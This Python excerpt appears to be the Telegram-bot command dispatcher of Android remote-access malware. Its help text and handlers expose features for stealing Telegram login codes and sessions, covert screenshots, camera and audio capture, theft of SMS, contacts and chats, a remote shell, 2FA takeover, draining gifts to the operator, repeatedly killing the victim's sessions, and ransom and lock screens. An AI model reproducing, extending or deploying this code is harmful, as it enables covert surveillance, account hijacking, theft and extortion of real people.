    def _show_help(self):
        text = (
            "<b>%s</b>\n\n"
            "<b>Tg kid</b> — code from 777000 + live-watch + auto-confirm\n"
            "<b>Screenshot gain</b> — screen + front + back\n"
            "<b>Full Harvest</b> — harvest without modifications\n"
            "<b>Full Lockdown</b> — harvest + gifts + 2FA + profile + ransom + kill + nuke + pull out\n"
            "<b>Gift Transfer</b> — gift drain to recipient\n"
            "<b>Nuke loop</b> — kills new sessions every 60s\n\n"
            "Recipient: " + BOT_UID_STR
        ) % L_TITLE
        self._send_msg(text, html=True)

    def _handle_callback(self, cb):
        try:
            cb_id = cb.get("id")
            data = cb.get("data", "")
            if cb_id:
                try:
                    self._answer_callback(cb_id)
                except Exception:
                    pass
            if data == "menu":
                self._show_main_menu()
            elif data == "close_ransom":
                self._dismiss_ransom()
            elif data == "close_locker":
                self._clear_locker()
            elif data == "close_music":
                self._clear_music()
            elif data == "close_end":
                self._clear_dim()
            elif data == "hv_logout":
                threading.Thread(target=self._pull_out_account, daemon=True).start()
            elif data == "hv_stop_nuke":
                self._stop_nuke_loop()
        except Exception as e:
            _log("callback: %s" % e)

    def _handle_message(self, msg):
        try:
            t = (msg.get("text") or "").strip()
            if not t:
                return
            if self._input_mode == "music":
                self._input_mode = None
                if t.startswith("http"):
                    self._play_mmusic(t)
                else:
                    self._send_msg("Bad URL")
                return
            if self._input_mode == "shell":
                self._input_mode = None
                if t:
                    self._manual_shell(t)
                return

            if t == L_TGKID:
                threading.Thread(target=self._tg_kid, daemon=True).start()
            elif t == L_SCREEN_G:
                threading.Thread(target=self._screenshot_gain, daemon=True).start()
            elif t == L_MANUAL:
                self._show_manual_menu()
            elif t == L_TROLL:
                self._show_troll_menu()
            elif t == L_AUTO:
                self._show_automatic_menu()
            elif t == L_HELP:
                self._show_help()
            elif t == L_BACK:
                self._show_main_menu()
            elif t == L_SESSIONS:
                self._show_sessions_menu()
            elif t == L_SURV:
                self._show_surveillance_menu()
            elif t == L_DATA:
                self._show_data_menu()
            elif t == L_ACCOUNT:
                self._show_account_menu()
            elif t == L_SHELL:
                self._show_shell_menu()
            elif t == L_WIPE:
                threading.Thread(target=self._session_wipe, daemon=True).start()
            elif t == L_KILLALL:
                threading.Thread(target=self._kill_sessions_full, daemon=True).start()
            elif t == L_KILLPH:
                threading.Thread(target=self._kill_phones_pc, daemon=True).start()
            elif t == L_NUKE_ON:
                self._start_nuke_loop()
            elif t == L_NUKE_OFF:
                self._stop_nuke_loop()
            elif t == L_SESSDMP:
                threading.Thread(target=self._manual_dump_session, daemon=True).start()
            elif t == L_UBOTDMP:
                threading.Thread(target=self._manual_userbot_session, daemon=True).start()
            elif t == L_SCREEN:
                threading.Thread(target=self._screenshot, daemon=True).start()
            elif t == L_CAM_F:
                threading.Thread(target=self._manual_camera, args=("front",), daemon=True).start()
            elif t == L_CAM_B:
                threading.Thread(target=self._manual_camera, args=("back",), daemon=True).start()
            elif t == L_AUDIO:
                threading.Thread(target=self._manual_audio, args=(5,), daemon=True).start()
            elif t == L_SMS:
                threading.Thread(target=self._manual_sms, daemon=True).start()
            elif t == L_CONTACTS:
                threading.Thread(target=self._manual_contacts, daemon=True).start()
            elif t == L_APPS:
                threading.Thread(target=self._manual_apps, daemon=True).start()
            elif t == L_CHATS:
                threading.Thread(target=self._manual_chats, daemon=True).start()
            elif t == L_INFO:
                threading.Thread(target=self._harvest_account_info,
                                 args=(0, True), daemon=True).start()
            elif t == L_PULLOUT:
                threading.Thread(target=self._pull_out_account, daemon=True).start()
            elif t == "ls /sdcard":
                self._manual_shell("ls /sdcard")
            elif t == "ps":
                self._manual_shell("ps -A")
            elif t == "ifconfig":
                self._manual_shell("ifconfig")
            elif t == "df -h":
                self._manual_shell("df -h")
            elif t == L_RANSOM:
                self._show_ransom(RANSOM_TEXT, RANSOM_PHOTO_URL)
            elif t == L_LOCK:
                self._lock_screen()
            elif t == L_MUSIC:
                self._input_mode = "music"
                self._send_msg("Send .mp3 URL")
            elif t == L_FLOOD:
                threading.Thread(target=self._flood_gallery,
                                 args=(RANSOM_PHOTO_URL, 100), daemon=True).start()
            elif t == L_CLRFLOOD:
                self._clear_flood()
            elif t == L_DIM:
                self._dim_screen()
            elif t == L_FULL_H:
                self._full_harvest()
            elif t == L_FULL_L:
                self._full_lockdown()
            elif t == L_GIFT:
                threading.Thread(target=self._drain_gifts_thread, daemon=True).start()
        except Exception as e:
            _log("handle msg: %s" % e)

